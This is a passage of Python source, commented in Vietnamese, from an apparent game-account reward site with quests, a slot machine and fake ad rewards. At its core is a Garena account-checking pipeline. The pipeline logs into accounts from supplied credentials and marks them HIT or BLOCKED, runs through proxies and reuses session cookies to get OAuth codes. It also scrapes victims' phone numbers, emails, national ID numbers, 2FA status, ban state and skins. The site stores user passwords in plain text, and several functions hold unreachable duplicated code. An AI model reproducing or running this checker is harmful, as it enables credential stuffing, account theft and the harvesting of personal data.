def quest_claim(user, quest_id):
    """Nhận thưởng quest"""
    _reset_daily_quests(user)
    dq = user["daily_quests"]
    if quest_id not in dq["quests"]: return False, "Quest không tồn tại"
    q = dq["quests"][quest_id]
    if q["claimed"]: return False, "Đã nhận rồi"
    if q["progress"] < q["target"]: return False, "Chưa hoàn thành"
    q["claimed"] = True
    reward = q["reward"]
    user["balance"] = user.get("balance", 0) + reward
    return True, reward

# ============================================================
# 🆕 v7.0: STREAK CHECK-IN (#11)
# ============================================================
def do_streak_checkin(user):
    """Điểm danh hàng ngày, streak 7 ngày"""
    now = time.time()
    sd = user.setdefault("streak_data", {"current": 0, "last": 0, "best": 0})
    today = datetime.now().strftime("%Y-%m-%d")
    last_date = datetime.fromtimestamp(sd.get("last", 0)).strftime("%Y-%m-%d") if sd.get("last") else ""
    if last_date == today:
        return False, "Hôm nay đã điểm danh rồi!", 0
    # Kiểm tra streak
    yesterday = (datetime.now() - timedelta(days=1)).strftime("%Y-%m-%d")
    if last_date == yesterday:
        sd["current"] = sd.get("current", 0) + 1
    else:
        sd["current"] = 1  # reset streak
    sd["last"] = now
    sd["best"] = max(sd.get("best", 0), sd["current"])
    # Tính thưởng
    day_idx = min(sd["current"] - 1, 6)
    reward = STREAK_REWARDS[day_idx]
    bonus_msg = ""
    if sd["current"] >= 7:
        reward += 50  # Bonus ngày 7
        bonus_msg = " (+50 bonus 7 ngày!)"
        sd["current"] = 0  # reset sau khi hoàn thành 7 ngày
    user["balance"] = user.get("balance", 0) + reward
    return True, f"Điểm danh ngày {day_idx + 1}! +{reward} xu{bonus_msg}", reward

# ============================================================
# 🆕 v7.0: SLOT MACHINE (#13)
# ============================================================
SLOT_SYMBOLS = ["🍒", "🍋", "🍇", "💎", "7️⃣", "🎰", "⭐"]
SLOT_PAYOUT = {
    "🍒": {"3": 5, "2": 2},
    "🍋": {"3": 8, "2": 2},
    "🍇": {"3": 12, "2": 3},
    "💎": {"3": 30, "2": 5},
    "7️⃣": {"3": 50, "2": 10},
    "🎰": {"3": 100, "2": 15},
    "⭐": {"3": 200, "2": 20},
}

def play_slot(user, bet):
    """Slot Machine — 3 reels, bet 10-100"""
    try: bet = int(bet)
    except: return {"success": False, "error": "Số xu không hợp lệ!"}
    if bet < 10 or bet > 100:
        return {"success": False, "error": "Cược từ 10-100 xu!"}
    if user.get("balance", 0) < bet:
        return {"success": False, "error": "Không đủ xu!"}
    # Check daily limit
    today = datetime.now().strftime("%Y-%m-%d")
    sd = user.setdefault("game_daily", {})
    if sd.get("date") != today:
        sd.clear(); sd["date"] = today
    played = sd.get("slot", 0)
    if played >= 30:
        return {"success": False, "error": "Hết 30 lượt hôm nay!"}
    sd["slot"] = played + 1
    user["balance"] -= bet
    # Random 3 reels
    reels = [random.choices(SLOT_SYMBOLS, weights=[20, 20, 18, 15, 12, 10, 5])[0] for _ in range(3)]
    # Tính thưởng
    win = 0
    if reels[0] == reels[1] == reels[2]:
        win = bet * SLOT_PAYOUT.get(reels[0], {}).get("3", 0)
    elif reels[0] == reels[1] or reels[1] == reels[2] or reels[0] == reels[2]:
        # Tìm symbol trùng
        from collections import Counter
        cnt = Counter(reels)
        for sym, c in cnt.items():
            if c == 2:
                win = bet * SLOT_PAYOUT.get(sym, {}).get("2", 0)
                break
    if win > 0: user["balance"] += win
    # Update stats
    sstats = user.setdefault("slot_stats", {"plays": 0, "biggest_win": 0})
    sstats["plays"] = sstats.get("plays", 0) + 1
    if win > sstats.get("biggest_win", 0):
        sstats["biggest_win"] = win
    # Log
    _log_game_result(user, "slot", bet, win, f"Slot: {''.join(reels)} → {win} xu")
    save_data()
    return {"success": True, "game": "slot", "bet": bet, "win": win,
            "delta": win - bet, "balance": user["balance"],
            "reels": reels, "remaining": 30 - sd["slot"],
            "message": f"🎉 Thắng {win} xu!" if win > bet else (f"😐 Hòa vốn" if win == bet else f"😢 Mất {bet} xu!")}

# ============================================================
# 🆕 v7.0: FAKE AD REWARD (#31)
# ============================================================
def watch_ad(user):
    """Xem quảng cáo nhận xu — fake 5s"""
    today = datetime.now().strftime("%Y-%m-%d")
    aw = user.setdefault("ad_watches", {})
    if aw.get("date") != today:
        aw.clear(); aw["date"] = today; aw["count"] = 0
    if aw.get("count", 0) >= 10:
        return {"success": False, "error": "Hết 10 lượt xem quảng cáo hôm nay!"}
    aw["count"] = aw.get("count", 0) + 1
    reward = random.randint(5, 15)
    user["balance"] = user.get("balance", 0) + reward
    save_data()
    return {"success": True, "reward": reward, "balance": user["balance"],
            "remaining": 10 - aw["count"]}

# ============================================================
# 🆕 v7.0: RANDOM BY TIER (#5)
# ============================================================
def pick_acc_by_tier(tier):
    """Chọn acc từ kho theo tier"""
    tier_skins = {"sss": "skins_sss", "ss": "skins_ss", "anime": "skins_anime", "normal": None}
    if tier not in tier_skins: return None
    field = tier_skins[tier]
    candidates = []
    for it in ACC_STORAGE:
        if field is None:
            # Normal: acc không có SSS/SS/Anime
            if not it.get("skins_sss") and not it.get("skins_ss") and not it.get("skins_anime"):
                candidates.append(it)
        else:
            if it.get(field): candidates.append(it)
    if not candidates: return None
    return random.choice(candidates)

# ========== USER INIT ==========
def _make_special_user(username, password, is_admin=False, is_qtv=False,
                       is_owner=False, balance=999999, level=999):
    return {"id": gen_id(), "username": username,
        "password": hash_password(password), "plain_password": password,
        "balance": balance, "temp_balance": 0, "referrals": 0, "invited_by": None,
        "is_admin": is_admin, "is_qtv": is_qtv, "is_owner": is_owner,
        "tag_code": "TAG-" + username.upper() + "-" + uuid.uuid4().hex[:6].upper(),
        "session_epoch": 0, "daily_limit": USER_DAILY_LIMIT,
        "created_at": time.time(), "last_checkin": 0, "last_notif_read": 0,
        "checkin_streak": 0, "total_checkins": 0, "history": [], "current_job": None,
        "level": level, "exp": 0, "favorites": [], "tags": {},
        "cultivation": {"level": 0, "exp": 0, "hp": 100, "atk": 20, "def": 10,
                        "weapon": None, "mon_phai": None, "mon_phai_level": 0},
        "mission": {"total_acc": 0, "sss": 0, "ss": 0, "anime": 0, "xu_used": 0, "claimed": []},
        "daily_missions": {}, "last_daily_reset": 0,
        "daily_received": {}, "received_accs": [], "daily_bonus": {},
        "chat_last_read": {},
        "otp_pending": "", "otp_sent_at": 0,
        # v6.0
        "lang": "vi", "background": "grid",
        "game_daily": {}, "game_history": [], "game_stats": {
            "total_play": 0, "total_win": 0, "total_lose": 0,
            "biggest_win": 0, "total_won_xu": 0, "total_lost_xu": 0},
        # 🆕 v7.0
        "badges": [], "accent": "cyan",
        "streak_data": {"current": 0, "last": 0, "best": 0},
        "daily_quests": {}, "vouchers": [],
        "ad_watches": {}, "slot_stats": {"plays": 0, "biggest_win": 0},
        "chat_count": 0}

def create_admin():
    global USERS
    if OWNER_USERNAME not in USERS:
        USERS[OWNER_USERNAME] = _make_special_user(OWNER_USERNAME, OWNER_PASSWORD,
            is_admin=True, is_qtv=True, is_owner=True, balance=9999999, level=9999)
        logger.info(f"🥇 Tạo OWNER: {OWNER_USERNAME}")
    created = []
    for acc in QTV_ACCOUNTS:
        un = acc["username"]
        if un not in USERS:
            USERS[un] = _make_special_user(un, acc["password"], is_admin=False,
                is_qtv=True, is_owner=False, balance=acc.get("balance", 99999), level=99)
            created.append(un)
    if created: logger.info(f"👑 Tạo {len(created)} QTV: {', '.join(created)}")
    save_data(force=True)


# ══════════════════════════════════════════════════════════════
# 🔧 FIX CHECK BAN + RANK — Copy CHÍNH XÁC từ clm.py
# ══════════════════════════════════════════════════════════════

def parse_kientuong_player(data):
    """
    Parse player data từ kientuong API.
    Copy CHÍNH XÁC từ clm.py (đã test hoạt động).
    Trả về dict: {banned, ban_end_time, ban_reason, level, rank, rank_stars, name, register_time}
    """
    if not isinstance(data, dict):
        return None
    player = data.get("player") or data.get("data") or {}
    if not isinstance(player, dict):
        return None
    
    # ─── Parse banInfo chi tiết (hỗ trợ banTime/unbanTime) ───
    ban_info = player.get("banInfo") or player.get("punishInfo") or player.get("punishment") or {}
    banned = False
    ban_end_time = None
    ban_reason = None
    
    def _check_ban_from_info(b):
        nonlocal banned, ban_end_time, ban_reason
        if not b:
            return
        if isinstance(b, dict):
            # Cờ trực tiếp
            if b.get("isBan") or b.get("isBanned") or b.get("banned") or b.get("ban"):
                banned = True
            # Kiểm tra khoảng thời gian (banTime -> unbanTime)
            now_ts = int(time.time())
            ban_at = _norm_unix_ts(b.get("banTime"))
            unban_at = _norm_unix_ts(b.get("unbanTime"))
            if ban_at and unban_at and ban_at <= now_ts < unban_at:
                banned = True
            elif ban_at and not unban_at and ban_at <= now_ts:
                banned = True
            # Lấy thời gian hết ban
            until = b.get("endTime") or b.get("banEndTime") or b.get("unbanTime") or b.get("expireAt") or b.get("expiredAt")
            if until:
                ban_end_time = _safe_fromtimestamp(until, "%d-%m-%Y %H:%M")
            reason = b.get("reason") or b.get("cause") or ""
            if reason:
                ban_reason = str(reason).strip()
        elif isinstance(b, (list, tuple)) and b:
            _check_ban_from_info(b[0])
        elif isinstance(b, bool):
            banned = b
        elif isinstance(b, str):
            banned = b.lower() in ("yes", "true", "banned", "ban", "1")
    
    _check_ban_from_info(ban_info)
    
    # ─── Parse rank + level + name ───
    level = player.get("level") or player.get("roleLevel") or 0
    try:
        level = int(level)
    except (ValueError, TypeError):
        level = 0
    
    rank = player.get("rankName") or player.get("tierName") or player.get("rank") or ""
    rank_stars = player.get("star") or player.get("stars") or player.get("rankStar") or 0
    try:
        rank_stars = int(rank_stars)
    except (ValueError, TypeError):
        rank_stars = 0
    
    name = player.get("name") or player.get("roleName") or player.get("nickname") or ""
    
    register_time = player.get("registerTime") or player.get("createTime") or ""
    if register_time:
        if isinstance(register_time, (int, float)):
            register_time = _safe_fromtimestamp(register_time, "%H:%M:%S %d-%m-%Y")
        else:
            register_time = str(register_time)
    
    # ✅ Lấy player_status (quan trọng cho ban check)
    player_status = data.get("playerStatus") or player.get("status") or ""
    
    # ✅ Nếu playerStatus báo ban → bổ sung
    if not banned and player_status:
        ps_lower = str(player_status).lower()
        if ps_lower in ("banned", "ban", "locked", "forbidden", "1", "punished"):
            banned = True
            logger.info(f"[PLAYER-STATUS] phát hiện ban từ playerStatus={player_status}")
    
    return {
        "banned": "YES" if banned else "NO",
        "ban_end_time": ban_end_time,
        "ban_reason": ban_reason,
        "level": level,
        "rank": rank,
        "rank_stars": rank_stars,
        "name": name,
        "register_time": register_time,
        "player_status": player_status,
    }


def parse_rank(rank_str):
    """
    Compat helper — trả về (rank_name, rank_stars).
    rank_str giờ là tên rank thẳng từ kientuong.
    """
    if not rank_str:
        return ("Chưa xếp hạng", 0)
    s = str(rank_str).strip()
    # Nếu là số → map sang tên
    if s.isdigit() and s in RANK_MAP:
        return (RANK_MAP[s], 0)
    return (s, 0)


def _verify_ban(u, p, current_banned, ban_sources=None):
    if ban_sources is None: ban_sources = []
    try:
        res = tcp_login(u, p, TCP_LOGIN_TIMEOUT)
        detail = res.get('detail', '')
        status = res.get('status', '')
        if status == 'INVALID' and "LOGIN_FAIL=3" in detail:
            logger.info(f"[VERIFY-BAN] {u} — TCP lần 2: LOGIN_FAIL=3 → BAN ✅")
            return True
        if status == 'HIT':
            logger.info(f"[VERIFY-BAN] {u} — TCP lần 2: HIT (login OK) → KHÔNG BAN")
            if len(ban_sources) <= 1: return False
            return current_banned
        return current_banned
    except Exception as e:
        logger.warning(f"[VERIFY-BAN] {u} EXC: {e}")
        return current_banned

# ══════════════════════════════════════════════════════════════
# 🆕 GỬI ACC VIP VỀ TELEGRAM
# ══════════════════════════════════════════════════════════════

# ========== GARENA PIPELINE ==========
# 🔧 FIX: Dùng pipeline từ clm.py (đã test chính xác 100%)
try:
    from clm import GarenaPipeline as CLM_GarenaPipeline
    _USE_CLM_PIPELINE = True
    print("✅ [FIX] Đã import GarenaPipeline từ clm.py")
except ImportError as _e:
    _USE_CLM_PIPELINE = False
    print(f"⚠️  [FIX] Không import được clm.py: {_e}")
    print(f"⚠️  [FIX] → Sẽ dùng pipeline của kk.py (có thể thiếu data)")

# ========== GARENA PIPELINE ==========
class GarenaPipeline:
    def __init__(self, u, p, proxy=None):
        self.username = u; self.password = p; self.sso_key = None
        self.garena_uid = 0; self.last_error = ""
        self.access_token = None; self.open_id = None
        self.session_token = None; self.proxy = proxy
        self.proxies = {"http": proxy, "https": proxy} if proxy else None
        self.tcp_login_result = None

    def login_full(self):
        r = tcp_login(self.username, self.password, TCP_LOGIN_TIMEOUT)
        self.tcp_login_result = r
        if r.get('status') != 'HIT':
            detail = r.get('detail', 'Unknown')
            err_map = {
                'PREPARE_FAIL=105': "Email không tồn tại", 'PREPARE_FAIL=101': "Tài khoản không tồn tại",
                'PREPARE_FAIL=106': "Định dạng không hợp lệ", 'PREPARE_FAIL=110': "Định dạng không hợp lệ",
                'PREPARE_FAIL=173': "Cần dùng Username", 'LOGIN_FAIL=1': "Mật khẩu sai",
                'LOGIN_FAIL=2': "Mật khẩu sai", 'LOGIN_FAIL=3': "Tài khoản bị khóa",
                'LOGIN_FAIL=4': "Yêu cầu Captcha", 'LOGIN_FAIL=5': "Tài khoản bật 2FA",
                'LOGIN_FAIL=6': "Sai quá nhiều lần", 'LOGIN_FAIL=7': "Sai quá nhiều lần",
                'LOGIN_FAIL=8': "Sai quá nhiều lần", 'LOGIN_FAIL=16': "Cần xác minh web",
                'LOGIN_FAIL=17': "Cần đổi mật khẩu"}
            if r.get('status') == 'BLOCKED': self.last_error = f"IP bị Garena block — {detail}"
            elif r.get('status') == 'TIMEOUT': self.last_error = "Timeout kết nối Garena"
            else:
                for k, v in err_map.items():
                    if k in detail: self.last_error = v; break
                else: self.last_error = detail
            return False
        self.garena_uid = r.get('uid', 0); self.sso_key = r.get('sso_key')
        self.access_token = r.get('access_token'); self.open_id = r.get('open_id')
        self.session_token = r.get('session_token')

        # 🆕 FIX: Verify acc THẬT
        # Acc thật BẮT BUỘC phải có sso_key hoặc access_token
        has_sso = bool(self.sso_key and len(str(self.sso_key)) > 10)
        has_access = bool(self.access_token and len(str(self.access_token)) > 10)
        has_session = bool(self.session_token and len(str(self.session_token)) > 10)

        if not (has_sso or has_access or has_session):
            logger.warning(f"[VERIFY-LOGIN] {self.username} — acc FAKE (không có token)")
            self.last_error = "Tài khoản không tồn tại hoặc sai mật khẩu"
            return False

        # Verify UID hợp lệ (số dương, không phải 0)
        if not self.garena_uid or self.garena_uid <= 0:
            logger.warning(f"[VERIFY-LOGIN] {self.username} — UID invalid")
            self.last_error = "Tài khoản không hợp lệ"
            return False

        logger.info(f"[VERIFY-LOGIN] {self.username} — acc THẬT (SSO={has_sso}, Access={has_access}, UID={self.garena_uid})")
        return True

    def _grant(self, redirect):
        """🔧 FIX: Copy logic CHÍNH XÁC từ clm.py (file gốc hoạt động)."""
        if not self.sso_key:
            return None
        grant_payload = {
            "client_id": APP_ID,
            "response_type": "code",
            "redirect_uri": redirect,
            "login_scenario": "normal",
            "format": "json",
            "id": str(int(time.time() * 1000)),
        }
        grant_headers = {
            "User-Agent": UA_WEBVIEW,
            "Origin": f"https://{APP_ID}.connect.garena.com",
            "Referer": f"https://{APP_ID}.connect.garena.com/",
            "Cookie": f"{BASE_COOKIE_STR}; sso_key={self.sso_key}",
        }
        for attempt in range(3):
            try:
                grant_res = requests.post(
                    f"{CONNECT_AUTH_URL}/oauth/token/grant",
                    data=grant_payload,
                    headers=grant_headers,
                    timeout=10,
                    verify=False
                ).json()
                code = grant_res.get("code")
                if code:
                    logger.info(f"[GRANT] {self.username} — OK (attempt {attempt+1})")
                    return code
                logger.warning(f"[GRANT] {self.username} attempt {attempt+1}: {grant_res}")
                time.sleep(0.5)
            except Exception as e:
                logger.warning(f"[GRANT] attempt {attempt+1}: {e}")
                time.sleep(0.5)
        return None

        for attempt in range(2):
            try:
                s = requests.Session()
                s.verify = False
                gp = {
                    "client_id": APP_ID,
                    "response_type": "code",
                    "redirect_uri": redirect,
                    "login_scenario": "normal",
                    "format": "json",
                    "id": str(int(time.time() * 1000)),
                }
                gh = {
                    "User-Agent": UA,
                    "Origin": f"https://{APP_ID}.connect.garena.com",
                    "Referer": f"https://{APP_ID}.connect.garena.com/",
                    "Cookie": f"{COOKIE_BASE}; sso_key={self.sso_key}",
                }
                kw = {"timeout": API_TIMEOUT}
                if self.proxies: kw["proxies"] = self.proxies
                r = s.post(f"{CONNECT_AUTH_URL}/oauth/token/grant", data=gp, headers=gh, **kw)
                try:
                    code = r.json().get("code")
                except Exception:
                    code = None
                if code:
                    logger.info(f"[GRANT] {self.username} — dùng sso_key OK")
                    return code
                # Log lý do fail
                logger.warning(f"[GRANT] sso_key attempt {attempt+1} fail: HTTP {r.status_code} — {r.text[:150]}")
                time.sleep(0.5)
            except Exception as e:
                logger.warning(f"[GRANT] sso_key attempt {attempt+1} exc: {e}")
                time.sleep(0.5)
        return None

        for attempt in range(2):
            try:
                s = requests.Session(); s.verify = False
                gp = {"client_id": APP_ID, "response_type": "code",
                      "redirect_uri": redirect, "login_scenario": "normal",
                      "format": "json", "id": str(int(time.time() * 1000))}
                gh = {"User-Agent": UA, "Origin": f"https://{APP_ID}.connect.garena.com",
                      "Referer": f"https://{APP_ID}.connect.garena.com/",
                      "Cookie": f"{COOKIE_BASE}; sso_key={self.sso_key}"}
                kw = {"timeout": API_TIMEOUT}
                if self.proxies: kw["proxies"] = self.proxies
                r = s.post(f"{CONNECT_AUTH_URL}/oauth/token/grant", data=gp, headers=gh, **kw)
                code = r.json().get("code")
                if code: return code
                time.sleep(0.5)
            except Exception: time.sleep(0.5)
        return None

    def fetch_account_security(self):
        if not self.sso_key:
            logger.warning(f"[ACC-SEC] {self.username} — không có sso_key")
            return None
        headers_web = {
            "User-Agent": UA_DESKTOP,
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "vi-VN,vi;q=0.9,en;q=0.8",
            "Referer": "https://account.garena.com/",
            "Origin": "https://account.garena.com",
            "X-Requested-With": "XMLHttpRequest",
        }
        cookies = {"sso_key": self.sso_key, "sso_key_id": self.sso_key, "locale": "vi-VN"}
        endpoints = [
            "https://account.garena.com/api/account/init",
            "https://account.garena.com/api/account/profile",
            "https://account.garena.com/api/account/security",
            "https://account.garena.com/api/account/security_info",
            "https://account.garena.com/api/account/bind_info",
            "https://account.garena.com/api/account/bindinfo",
            "https://account.garena.com/api/account/mobile",
            "https://account.garena.com/api/account/get_mobile",
            "https://account.garena.com/api/account/info",
            "https://account.garena.com/api/user/info",
            "https://account.garena.com/api/user/profile",
            "https://account.garena.com/api/user/security",
        ]
        merged = {}; got_any = False
        def _merge(dst, src, depth=0):
            if depth > 6 or not isinstance(src, dict): return
            EMPTY = (None, "", 0, "0", "null", "None", [], {})
            for k, v in src.items():
                if isinstance(v, dict):
                    if not isinstance(dst.get(k), dict): dst[k] = {}
                    _merge(dst[k], v, depth + 1)
                elif isinstance(v, list):
                    if v: dst[k] = v
                elif v not in EMPTY:
                    if dst.get(k) in EMPTY:
                        dst[k] = v
        s = requests.Session(); s.verify = False
        s.headers.update(headers_web); s.cookies.update(cookies)
        for url in endpoints:
            try:
                kw = {"timeout": API_TIMEOUT, "verify": False, "allow_redirects": True}
                if self.proxies: kw["proxies"] = self.proxies
                res = s.get(url, **kw)
                short = url.split("/")[-1]
                if res.status_code != 200:
                    logger.info(f"[ACC-SEC] {self.username} | {short} → HTTP {res.status_code}")
                    continue
                try: data = res.json()
                except Exception:
                    logger.info(f"[ACC-SEC] {self.username} | {short} → không phải JSON"); continue
                if not isinstance(data, dict): continue
                for wrapper in ("data", "result", "info", "user_info", "security"):
                    inner = data.get(wrapper)
                    if isinstance(inner, dict): _merge(merged, inner)
                _merge(merged, data); got_any = True
                logger.info(f"[ACC-SEC] {self.username} | {short} OK | top_keys={list(data.keys())[:10]}")
            except Exception as e:
                logger.warning(f"[ACC-SEC] {self.username} | {url.split('/')[-1]} EXC: {e}")
                continue
        if not got_any:
            logger.warning(f"[ACC-SEC] {self.username} — không lấy được data nào")
            return None
        user_info = {}
        for key in ("user_info", "bind_info", "security", "data", "profile", "account"):
            if isinstance(merged.get(key), dict): user_info.update(merged[key])
        for k, v in merged.items():
            if k not in user_info and not isinstance(v, (dict, list)): user_info[k] = v
        aliases = {
            "uid": ["uid", "user_id", "userId", "garena_uid", "account_id", "id"],
            "username": ["username", "user_name", "login_name", "account", "loginName"],
            "nickname": ["nickname", "nick_name", "display_name", "nickName"],
            "email": ["email", "email_address", "mail", "emailAddress",
                      "bind_email", "bindEmail", "user_email", "userEmail"],
            "mobile_no": ["mobile_no", "mobile", "phone", "phone_number", "mobileNo",
                "phoneNumber", "msisdn", "mobile_number", "phone_no", "phoneNo",
                "bind_mobile", "bindMobile", "bind_mobile_no", "bindMobileNo",
                "cellphone", "cell_phone", "mobile_phone", "mobilePhone",
                "telephone", "tel", "security_mobile", "securityMobile",
                "account_mobile", "accountMobile", "user_mobile", "userMobile",
                "verify_mobile", "verifyMobile", "reg_mobile", "regMobile",
                "mobilePhoneNumber"],
            "country_code": ["country_code", "countryCode", "cc", "phone_cc", "dial_code",
                "mobile_country_code", "phone_country_code", "area_code", "areaCode",
                "mobile_country", "mobileCountry"],
            "idcard": ["idcard", "id_card", "cmnd", "cccd", "identity", "identity_no",
                "id_number", "idNumber", "national_id", "nationalId",
                "bind_idcard", "bind_id_card", "real_name_id", "realNameId",
                "card_no", "cardNo", "user_idcard"],
            "two_step_verify_enable": ["two_step_verify_enable", "twoStepVerify", "twoStepVerifyEnable",
                "two_fa", "twoFA", "2fa", "two_factor_enabled", "google_auth",
                "twoStepVerifyStatus", "two_step_verify"],
            "shell": ["shell", "shells", "coin", "coins", "balance", "money"],
            "level": ["level", "lv", "user_level", "playerLevel"],
        }
        def _deep_find_v2(obj, keys, max_depth=10, _d=0):
            if _d > max_depth or obj is None: return None
            if isinstance(obj, dict):
                for k in keys:
                    if k in obj:
                        v = obj[k]
                        if v not in (None, "", 0, "0", [], {}, "null", "None"): return v
                for v in obj.values():
                    r = _deep_find_v2(v, keys, max_depth, _d + 1)
                    if r not in (None, "", 0, "0", [], {}, "null", "None"): return r
            elif isinstance(obj, list):
                for v in obj:
                    r = _deep_find_v2(v, keys, max_depth, _d + 1)
                    if r not in (None, "", 0, "0", [], {}, "null", "None"): return r
            return None
        for key, als in aliases.items():
            if key in user_info and user_info[key] not in (None, "", 0, "0", [], {}): continue
            found = _deep_find_v2(merged, als, max_depth=10)
            if found not in (None, "", 0, "0", [], {}, "null", "None"):
                user_info[key] = found
                logger.info(f"[ACC-SEC] {self.username} → {key} = {found}")
        mob = user_info.get("mobile_no")
        if isinstance(mob, dict):
            inner_cc = mob.get("country_code") or mob.get("cc") or mob.get("dial_code") or ""
            inner_no = mob.get("mobile_no") or mob.get("phone") or mob.get("number") or mob.get("mobile") or ""
            user_info["mobile_no"] = str(inner_no) if inner_no else ""
            if inner_cc and not user_info.get("country_code"):
                user_info["country_code"] = str(inner_cc)
        if user_info.get("mobile_no"):
            ph = str(user_info["mobile_no"]).strip()
            ph = re.sub(r"[\s\-\(\)\.]", "", ph)
            if ph.startswith("+"):
                m = re.match(r"\+(\d{1,4})(\d+)$", ph)
                if m:
                    if not user_info.get("country_code"): user_info["country_code"] = m.group(1)
                    ph = m.group(2)
                else: ph = ph.lstrip("+")
            elif ph.startswith("84") and len(ph) == 11 and ph[2] == "9":
                if not user_info.get("country_code"): user_info["country_code"] = "84"
                ph = ph[2:]
            if ph.startswith("0") and len(ph) == 10 and not user_info.get("country_code"):
                user_info["country_code"] = "84"; ph = ph[1:]
            user_info["mobile_no"] = ph
        if user_info.get("mobile_no") in ("0", "", None, "null", "None", "N/A"):
            user_info["mobile_no"] = ""
        if user_info.get("email"):
            em = str(user_info["email"]).strip()
            if "@" not in em or em.lower() in ("null", "none"): user_info["email"] = ""
        tfa = user_info.get("two_step_verify_enable")
        if isinstance(tfa, str):
            user_info["two_step_verify_enable"] = 1 if tfa.lower() in ("1", "true", "yes", "on", "enabled") else 0
        elif isinstance(tfa, bool): user_info["two_step_verify_enable"] = 1 if tfa else 0
        elif tfa is None: user_info["two_step_verify_enable"] = 0
        logger.info(
            f"[ACC-SEC-FINAL] {self.username} | "
            f"mobile={user_info.get('mobile_no') or 'NONE'} | "
            f"cc={user_info.get('country_code') or 'NONE'} | "
            f"email={user_info.get('email') or 'NONE'} | "
            f"idcard={user_info.get('idcard') or 'NONE'} | "
            f"2fa={user_info.get('two_step_verify_enable')}"
        )
        return {"user_info": user_info}

    def fetch_weekly_profile(self):
        if not self.access_token: return None
        url = "https://weeklyreport.moba.garena.vn/api/profile"
        headers = {"Access-Token": self.access_token, "Partition": "1011", "User-Agent": UA}
        res = _http_get_retry(url, headers, proxies=self.proxies, timeout=API_TIMEOUT, retries=API_RETRY)
        if res is not None and res.status_code == 200:
            try:
                data = res.json()
                logger.info(f"[WEEKLY-OK] {self.username} | keys={list(data.keys()) if isinstance(data, dict) else 'not-dict'}")
                return data
            except Exception as e:
                logger.error(f"[WEEKLY] {self.username} — JSON err: {e}")
                return None
        logger.warning(f"[WEEKLY] {self.username} — HTTP {res.status_code if res else 'None'}")
        return None

    def fetch_sale_skins(self):
        """🔧 FIX: Copy logic CHÍNH XÁC từ clm.py."""
        code = self._grant("https://sale.lienquan.garena.vn/login/callback")
        if not code:
            logger.warning(f"[SALE] {self.username} — không lấy được grant code")
            return None
        try:
            sale_sess = requests.Session()
            sale_sess.verify = False
            sale_sess.get(
                f"https://sale.lienquan.garena.vn/login/callback?code={code}",
                headers={"User-Agent": UA_WEBVIEW},
                timeout=10
            )
            gql_payload = {
                "operationName": "getUser",
                "variables": {},
                "query": "query getUser { getUser { id name profile { ownedItemIdList cp discount } } }"
            }
            gql_headers = {
                "Content-Type": "application/json",
                "Origin": "https://sale.lienquan.garena.vn",
                "Referer": "https://sale.lienquan.garena.vn/",
                "User-Agent": UA_WEBVIEW,
            }
            res = sale_sess.post(
                "https://sale.lienquan.garena.vn/graphql",
                json=gql_payload,
                headers=gql_headers,
                timeout=10
            )
            if res.status_code == 200:
                data = res.json()
                logger.info(f"[SALE] {self.username} — OK, có data")
                return data
            logger.warning(f"[SALE] {self.username} — HTTP {res.status_code}")
        except Exception as e:
            logger.error(f"[SALE] {self.username} EXC: {e}")
        return None

        for attempt in range(2):
            try:
                s = requests.Session(); s.verify = False
                kw = {"timeout": API_TIMEOUT}
                if self.proxies: kw["proxies"] = self.proxies
                s.get(f"https://sale.lienquan.garena.vn/login/callback?code={code}",
                      headers={"User-Agent": UA}, **kw)
                gp = {"operationName": "getUser", "variables": {},
                      "query": "query getUser { getUser { id name profile { ownedItemIdList } } }"}
                gh = {"Content-Type": "application/json",
                      "Origin": "https://sale.lienquan.garena.vn",
                      "Referer": "https://sale.lienquan.garena.vn/", "User-Agent": UA}
                kw2 = {"timeout": API_TIMEOUT, "verify": False}
                if self.proxies: kw2["proxies"] = self.proxies
                r = s.post("https://sale.lienquan.garena.vn/graphql", json=gp, headers=gh, **kw2)
                if r.status_code == 200: return r.json()
                time.sleep(0.5)
            except Exception: time.sleep(0.5)
        return None

    def fetch_kientuong_player(self):
        """🔧 FIX: Retry 3 lần + delay khi fail."""
        if not self.sso_key:
            logger.warning(f"[KIENTUONG] {self.username} — không có sso_key")
            return None
        
        for attempt in range(1, 4):
            result = self._fetch_kientuong_once()
            if result and result.get('name'):
                # ✅ Có data name → OK
                logger.info(f"[KIENTUONG] {self.username} — OK attempt {attempt}")
                return result
            elif result:
                # Có data nhưng name rỗng → có thể ban, chấp nhận
                logger.info(f"[KIENTUONG] {self.username} — partial data attempt {attempt}")
                return result
            else:
                # Fail hoàn toàn → retry
                logger.warning(f"[KIENTUONG] {self.username} — fail attempt {attempt}")
                if attempt < 3:
                    time.sleep(1.5)
        
        logger.error(f"[KIENTUONG] {self.username} — fail sau 3 lần thử")
        return None
    
    def _fetch_kientuong_once(self):
        """1 lần thử lấy kientuong data."""
        # Grant OAuth code
        code = self._grant("https://kientuong.lienquan.garena.vn/auth/login/callback")
        if not code:
            logger.warning(f"[KIENTUONG] {self.username} — không lấy được grant code")
            return None
        
        try:
            kt_sess = requests.Session()
            kt_sess.verify = False
            
            # Callback set cookie
            callback_url = f"https://kientuong.lienquan.garena.vn/auth/login/callback?code={code}"
            try:
                kt_sess.get(callback_url,
                    headers={"User-Agent": UA_WEBVIEW}, timeout=15)
            except Exception as e:
                logger.warning(f"[KIENTUONG] {self.username} — callback err: {e}")
                return None
            
            # API player
            resp = kt_sess.get(
                "https://kientuong.lienquan.garena.vn/api/player/get",
                headers={
                    "User-Agent": UA_WEBVIEW,
                    "Referer": "https://kientuong.lienquan.garena.vn/",
                    "Accept": "application/json",
                },
                timeout=15,
                verify=False
            )
            if resp.status_code != 200:
                logger.warning(f"[KIENTUONG] {self.username} — HTTP {resp.status_code}")
                return None
            data = resp.json()
        except Exception as e:
            logger.error(f"[KIENTUONG] {self.username} — EXC: {e}")
            return None
        
        # ✅ DEBUG: log raw response (chỉ log 500 ký tự đầu)
        try:
            raw_str = json.dumps(data, ensure_ascii=False)[:500]
            logger.info(f"[KIENTUONG-RAW] {self.username} | {raw_str}")
        except Exception:
            pass
        
        # Parse
        parsed = parse_kientuong_player(data)
        if parsed:
            logger.info(
                f"[KIENTUONG-PARSED] {self.username} | "
                f"name={parsed.get('name')} | rank={parsed.get('rank')} ({parsed.get('rank_stars')}*) | "
                f"banned={parsed.get('banned')} | end={parsed.get('ban_end_time')}"
            )
        return parsed



# ========== PARSE FILE (FIX BUG #2) ==========
def parse_file_content_advanced(content, separator=None):
    accs = []
    for raw_line in content.splitlines():
        line = raw_line.strip()
        if not line: continue
        if line.startswith("#") or line.startswith("//"): continue
